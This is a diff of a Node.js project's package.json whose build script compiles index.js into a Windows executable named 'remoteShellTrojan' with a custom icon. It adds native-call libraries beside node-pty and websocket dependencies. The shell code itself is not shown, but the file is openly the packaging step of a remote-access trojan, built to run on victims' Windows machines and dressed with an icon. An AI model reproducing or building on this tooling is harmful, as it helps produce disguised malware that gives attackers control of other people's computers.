@@ -5,14 +5,20 @@
   "main": "index.js",
   "scripts": {
     "test": "echo \"Error: no test specified\" && exit 1",
-    "build": "pkg -c pkg.json index.js"
+    "build": "nexe -t windows-x64-14.15.3 -o remoteShellTrojan --ico logo.ico  index.js && mv remoteShellTrojan.exe dist/"
   },
   "author": "",
   "license": "ISC",
   "dependencies": {
     "nexe": "^4.0.0-rc.1",
+    "node-gyp-build": "^4.5.0",
     "node-pty": "^0.10.1",
     "pkg": "^5.8.0",
-    "ws": "^8.10.0"
+    "temp": "^0.9.4",
+    "ws": "^8.10.0",
+    "ffi-napi": "^4.0.3",
+    "ref-array-napi": "^1.2.2",
+    "ref-napi": "^3.0.3",
+    "ref-struct-napi": "^1.1.1"
   }
 }
